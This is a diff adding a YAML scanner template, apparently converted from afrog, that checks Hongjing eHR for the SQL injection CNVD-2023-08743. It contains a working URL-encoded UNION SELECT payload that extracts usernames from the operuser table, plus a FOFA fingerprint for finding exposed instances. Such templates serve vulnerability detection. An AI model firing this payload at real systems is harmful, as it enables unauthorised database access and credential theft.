@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - TreeNode id=
+          - text=
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d'
+id: CNVD-2023-08743
+info:
+  author: oxsonder
+  description: |
+    宏景人力系统 存在SQL注入漏洞(CNVD-2023-08743)，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。
+    fofa: body='<div class="hj-hy-all-one-logo"'
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 宏景 eHR SQL 注入漏洞
+  severity: high
+  tags: hjsoft,cve,cve2023,sqli,argus-import
